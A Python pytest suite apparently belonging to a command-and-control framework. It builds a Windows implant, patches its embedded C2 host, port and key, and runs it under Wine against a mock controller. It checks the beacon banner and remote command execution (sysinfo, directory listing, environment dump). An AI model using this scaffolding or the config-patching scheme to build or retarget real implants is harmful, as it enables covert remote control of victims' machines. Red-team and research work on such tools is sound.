"""
C2 protocol test suite — Tank implant ↔ Joshua controller.

Strategy
--------
Build a test implant (tank_test.exe) once per session with a known key
and a free listen port.  Run it under Wine against a Python mock server
that speaks the Joshua wire protocol: receives the Tank/1 banner, checks
the key, then sends commands and verifies responses.

Gate
----
Set C2_INTEGRATION=1 to run these tests.  They require:
  - Docker (to build the test implant)
  - Wine (to run tank.exe)
  - aeldrec2-builder image (docker build -t aeldrec2-builder .)

To run locally:
    C2_INTEGRATION=1 pytest tests/test_c2_protocol.py -v

Protocol (from tank.c)
----------------------
After connect, Tank immediately sends:
    Tank/1 host=<hostname> os=<major>.<minor>.<build> shell=<path> key=<8hex>\\n
Server authenticates the key, then sends commands (newline-terminated).
Responses end with <<<DONE>>>\\n.
"""

import os
import re
import socket
import struct
import subprocess
import threading
import time

import pytest
from conftest import AcceptServer, exe_path, free_port, wine_env, clu_patch

INTEGRATION = os.environ.get("C2_INTEGRATION", "0") == "1"
skip_unless_integration = pytest.mark.skipif(
    not INTEGRATION, reason="set C2_INTEGRATION=1 to run C2 protocol tests"
)

TEST_KEY    = "DEADBEEF"
WRONG_KEY   = "CAFEBABE"
DOCKER_IMAGE = "aeldrec2-builder"


# ------------------------------------------------------------------
# Build helpers — never modify windows/tank.exe in place
# ------------------------------------------------------------------

def _inside_docker():
    return os.path.exists("/.dockerenv")


def _ensure_tank_built(tmp_path):
    """
    Ensure windows/tank.exe exists and return its path.

    If already built, returns immediately (no build, no side-effects).
    If missing, runs a Docker build with default XFLAGS (no custom key or
    host — the default 00000000 / 127.0.0.1:4444 binary is fine; the
    caller will CLU-patch it to the desired settings).

    Never overwrites windows/tank.exe with a key-baked variant.
    Returns the path if available, None if the build failed.
    """
    import shutil

    repo = "/src" if _inside_docker() else os.path.abspath(
               os.path.join(os.path.dirname(__file__), ".."))
    src  = os.path.join(repo, "windows", "tank.exe")

    if os.path.exists(src):
        return src

    # Binary missing — trigger a default build
    if _inside_docker():
        cmd = ["wmake", "-f", "Makefile.wc", "tank.exe"]
        r = subprocess.run(cmd, capture_output=True, timeout=180,
                           cwd=os.path.join(repo, "windows"))
    else:
        cmd = [
            "docker", "run", "--rm",
            "-v", f"{repo}:/src", "-w", "/src/windows",
            DOCKER_IMAGE,
            "wmake", "-f", "Makefile.wc", "tank.exe",
        ]
        r = subprocess.run(cmd, capture_output=True, timeout=180)

    return src if (os.path.exists(src) and r.returncode == 0) else None


# ------------------------------------------------------------------
# Session-scoped test implant fixture — patched once, never recompiled
# ------------------------------------------------------------------

@pytest.fixture(scope="session")
def test_implant(tmp_path_factory):
    """
    Produce a test implant by CLU-patching the existing windows/tank.exe.

    This never modifies windows/tank.exe — it reads the binary, patches an
    in-memory copy with (host=127.0.0.1, port=<free>, key=DEADBEEF), and
    writes the result to a per-session temp file.  The default binary on
    disk (key=00000000) is untouched throughout the test run.

    If tank.exe does not exist yet, a default Docker build is triggered
    first (no custom XFLAGS — the key comes from CLU patching, not
    compile-time defines).
    """
    if not INTEGRATION:
        pytest.skip("set C2_INTEGRATION=1")

    port = free_port()
    tmp  = tmp_path_factory.mktemp("implant")

    base = _ensure_tank_built(tmp)
    if base is None:
        pytest.skip(
            f"tank.exe not found and Docker build failed "
            f"(image: {DOCKER_IMAGE})"
        )

    with open(base, "rb") as f:
        data = f.read()

    try:
        patched = clu_patch(data, host="127.0.0.1", port=port,
                            tls=0, key=TEST_KEY)
    except ValueError as e:
        pytest.skip(f"CLU patch failed: {e}")

    path = str(tmp / "tank_test.exe")
    with open(path, "wb") as f:
        f.write(patched)

    return {"path": path, "port": port, "key": TEST_KEY}


# ------------------------------------------------------------------
# Mock Joshua server — speaks the wire protocol
# ------------------------------------------------------------------

class MockJoshua:
    """
    Minimal Joshua server for testing the full Tank↔Joshua protocol.

    After accepting a connection:
      1. Reads the Tank/1 banner (up to the first \\n)
      2. Validates the key field against self.expected_key
      3. If key OK: enters command loop (send_commands list)
      4. Collects all output until <<<DONE>>>\\n for each command
      5. Closes the connection

    Public attributes set after run():
      .banner       — raw banner bytes
      .banner_str   — banner decoded as ASCII
      .key_ok       — True if the key in the banner matched expected_key
      .responses    — dict {command: response_text} for each command sent
      .connected    — threading.Event, set when a client connects
      .done         — threading.Event, set when the server thread exits
    """

    DONE_MARKER = b"<<<DONE>>>\n"

    def __init__(self, port=None, expected_key=TEST_KEY, send_commands=None):
        self.port         = port or free_port()
        self.expected_key = expected_key
        self.send_commands = send_commands or []

        self.banner    = b""
        self.key_ok    = False
        self.responses = {}
        self.connected = threading.Event()
        self.done      = threading.Event()

        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind(("127.0.0.1", self.port))
        self._srv.listen(1)
        self._srv.settimeout(20)
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _recv_line(self, conn):
        """Read bytes until \\n; return the line (including \\n), or b'' on close."""
        buf = b""
        while b"\n" not in buf:
            try:
                chunk = conn.recv(256)
            except socket.timeout:
                return buf
            if not chunk:
                return buf
            buf += chunk
        return buf

    def _recv_until_done(self, conn):
        """Read lines from tank until <<<DONE>>>\\n; return all content."""
        buf = b""
        while True:
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            if self.DONE_MARKER in buf:
                break
        return buf

    def _serve(self):
        try:
            conn, _ = self._srv.accept()
            self.connected.set()
            conn.settimeout(8)

            # Step 1: receive banner
            raw = self._recv_line(conn)
            self.banner = raw

            # Step 2: key check
            text = raw.decode("ascii", errors="replace")
            m = re.search(r" key=([0-9A-Fa-f]{8})", text)
            if m and m.group(1).upper() == self.expected_key.upper():
                self.key_ok = True
            else:
                # Wrong key or no key — close immediately (like Joshua does)
                conn.close()
                return

            # Step 3: command round-trips
            for cmd in self.send_commands:
                wire = (cmd + "\r\n").encode("ascii")
                try:
                    conn.sendall(wire)
                    resp = self._recv_until_done(conn)
                    self.responses[cmd] = resp.decode("ascii", errors="replace")
                except (OSError, socket.timeout):
                    break

            conn.close()
        except socket.timeout:
            pass
        except OSError:
            pass
        finally:
            try:
                self._srv.close()
            except OSError:
                pass
            self.done.set()

    def wait_connect(self, timeout=15):
        return self.connected.wait(timeout)

    def wait_done(self, timeout=20):
        return self.done.wait(timeout)

    @property
    def banner_str(self):
        return self.banner.decode("ascii", errors="replace")


# ------------------------------------------------------------------
# Helper: launch tank under Wine, run server interaction, terminate
# ------------------------------------------------------------------

def _run_tank(wine, implant_path, srv, extra_wait=2.0):
    """Start tank under Wine, wait for server interaction to complete, kill tank."""
    proc = subprocess.Popen(
        [wine, implant_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        env=wine_env(),
    )
    try:
        srv.wait_connect(timeout=15)
        srv.wait_done(timeout=20)
        time.sleep(extra_wait)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    return proc


# ------------------------------------------------------------------
# Protocol tests
# ------------------------------------------------------------------

@skip_unless_integration
def test_tank_connects_to_c2(wine, test_implant):
    """Tank must establish a TCP connection to the configured C2 host."""
    srv = MockJoshua(port=test_implant["port"])
    _run_tank(wine, test_implant["path"], srv)
    assert srv.connected.is_set(), "Tank did not connect to mock C2 within 15 s"


@skip_unless_integration
def test_tank_sends_banner(wine, test_implant):
    """Tank must send a Tank/1 banner immediately after connecting."""
    srv = MockJoshua(port=test_implant["port"])
    _run_tank(wine, test_implant["path"], srv)
    assert srv.banner.startswith(b"Tank/1 "), (
        f"Expected banner starting with 'Tank/1 ', got: {srv.banner!r}"
    )


@skip_unless_integration
def test_tank_banner_fields(wine, test_implant):
    """Banner must contain host=, os=, shell=, and key= fields."""
    srv = MockJoshua(port=test_implant["port"])
    _run_tank(wine, test_implant["path"], srv)
    banner = srv.banner_str
    assert "host="  in banner, f"No host= in banner: {banner!r}"
    assert "os="    in banner, f"No os= in banner: {banner!r}"
    assert "shell=" in banner, f"No shell= in banner: {banner!r}"
    assert " key="  in banner, f"No key= in banner: {banner!r}"

    m = re.search(r" key=([0-9A-Fa-f]{8})", banner)
    assert m, f"key= field missing or malformed in banner: {banner!r}"
    assert m.group(1).upper() == TEST_KEY.upper(), (
        f"Banner key {m.group(1)!r} != expected {TEST_KEY!r}"
    )


@skip_unless_integration
def test_tank_banner_os_is_windows(wine, test_implant):
    """os= field must look like a Windows version (digits.digits)."""
    srv = MockJoshua(port=test_implant["port"])
    _run_tank(wine, test_implant["path"], srv)
    m = re.search(r"os=(\d+\.\d+)", srv.banner_str)
    assert m, f"os= field not in expected format in banner: {srv.banner_str!r}"


@skip_unless_integration
def test_tank_key_accepted(wine, test_implant):
    """Server with the correct key must accept the connection (key_ok=True)."""
    srv = MockJoshua(port=test_implant["port"], expected_key=TEST_KEY)
    _run_tank(wine, test_implant["path"], srv)
    assert srv.key_ok, (
        f"Correct key {TEST_KEY!r} was not accepted.\nBanner: {srv.banner_str!r}"
    )


@skip_unless_integration
def test_tank_wrong_key_rejected(wine, test_implant):
    """
    A server expecting a different key must close the connection without
    entering the command loop.  The key_ok flag must remain False and no
    commands must be executed.
    """
    srv = MockJoshua(port=test_implant["port"], expected_key=WRONG_KEY,
                     send_commands=["sysinfo"])
    _run_tank(wine, test_implant["path"], srv)
    assert not srv.key_ok, (
        "Tank connected with wrong key but server treated it as authenticated"
    )
    assert "sysinfo" not in srv.responses, (
        "Server sent sysinfo to a tank with the wrong key"
    )


@skip_unless_integration
def test_tank_sysinfo_command(wine, test_implant):
    """
    Full round-trip: server sends 'sysinfo', tank must respond with text
    that ends with <<<DONE>>>.
    """
    srv = MockJoshua(port=test_implant["port"], expected_key=TEST_KEY,
                     send_commands=["sysinfo"])
    _run_tank(wine, test_implant["path"], srv, extra_wait=3.0)

    assert "sysinfo" in srv.responses, (
        f"sysinfo command received no response.  "
        f"key_ok={srv.key_ok}  banner={srv.banner_str!r}"
    )
    resp = srv.responses["sysinfo"]
    assert "<<<DONE>>>" in resp, (
        f"sysinfo response did not end with <<<DONE>>>:\n{resp!r}"
    )


@skip_unless_integration
def test_tank_ls_command(wine, test_implant):
    """
    'ls C:\\' must return a directory listing followed by <<<DONE>>>.
    """
    srv = MockJoshua(port=test_implant["port"], expected_key=TEST_KEY,
                     send_commands=["ls C:\\"])
    _run_tank(wine, test_implant["path"], srv, extra_wait=3.0)

    assert "ls C:\\" in srv.responses, (
        f"ls command received no response. key_ok={srv.key_ok}"
    )
    resp = srv.responses["ls C:\\"]
    assert "<<<DONE>>>" in resp, f"ls response did not end with <<<DONE>>>:\n{resp!r}"


@skip_unless_integration
def test_tank_multiple_commands(wine, test_implant):
    """
    Tank must handle multiple sequential commands in one session,
    each ending with <<<DONE>>>.
    """
    commands = ["sysinfo", "env"]
    srv = MockJoshua(port=test_implant["port"], expected_key=TEST_KEY,
                     send_commands=commands)
    _run_tank(wine, test_implant["path"], srv, extra_wait=5.0)

    for cmd in commands:
        assert cmd in srv.responses, (
            f"Command {cmd!r} got no response. key_ok={srv.key_ok}"
        )
        assert "<<<DONE>>>" in srv.responses[cmd], (
            f"Response to {cmd!r} did not end with <<<DONE>>>:\n{srv.responses[cmd]!r}"
        )


# ------------------------------------------------------------------
# Non-integration: sanity checks on built binary
# ------------------------------------------------------------------

def test_tank_exe_exists():
    path = exe_path("tank.exe")
    assert os.path.exists(path), "tank.exe not built — run docker build first"


def test_tank16_exe_exists():
    path = exe_path("tank16.exe")
    assert os.path.exists(path), "tank16.exe not built"


def test_clu_magic_in_tank():
    """CLU config block must be present and have the correct layout."""
    path = exe_path("tank.exe")
    if not os.path.exists(path):
        pytest.skip("tank.exe not built")
    with open(path, "rb") as f:
        data = f.read()
    magic = b"AELDRECLU0001"
    pos = data.find(magic)
    assert pos >= 0, "CLU magic not found in tank.exe"
    # Block layout: 14 magic + 64 host + 2 port + 1 tls + 9 key = 90 bytes
    assert pos + 90 <= len(data), "CLU block extends past end of file"


def test_clu_magic_in_tank16():
    """CLU config block must be present in tank16.exe."""
    path = exe_path("tank16.exe")
    if not os.path.exists(path):
        pytest.skip("tank16.exe not built")
    with open(path, "rb") as f:
        data = f.read()
    magic = b"AELDRECLU0001"
    assert data.find(magic) >= 0, "CLU magic not found in tank16.exe"


def test_clu_default_key_is_zeros():
    """Default tank.exe key field must be 00000000 (unpatched)."""
    path = exe_path("tank.exe")
    if not os.path.exists(path):
        pytest.skip("tank.exe not built")
    with open(path, "rb") as f:
        data = f.read()
    pos = data.find(b"AELDRECLU0001")
    assert pos >= 0
    key_bytes = data[pos + 81 : pos + 89]
    assert key_bytes == b"00000000", (
        f"Expected default key '00000000', got {key_bytes!r}"
    )


def test_clu_patch_roundtrip():
    """
    clu_patch() must produce a binary where the host, port, and key fields
    reflect what was patched, and the CLU magic is preserved.
    """
    path = exe_path("tank.exe")
    if not os.path.exists(path):
        pytest.skip("tank.exe not built")
    with open(path, "rb") as f:
        data = f.read()

    patched = clu_patch(data, host="10.20.30.40", port=9999,
                        tls=1, key="AABBCCDD")
    pos = patched.find(b"AELDRECLU0001")
    assert pos >= 0, "CLU magic vanished after patch"

    host = patched[pos+14:pos+78].rstrip(b"\x00").decode("ascii")
    port = struct.unpack_from("<H", patched, pos+78)[0]
    tls  = patched[pos+80]
    key  = patched[pos+81:pos+89].decode("ascii")

    assert host == "10.20.30.40", f"Patched host wrong: {host!r}"
    assert port == 9999,          f"Patched port wrong: {port}"
    assert tls  == 1,             f"Patched TLS flag wrong: {tls}"
    assert key  == "AABBCCDD",   f"Patched key wrong: {key!r}"
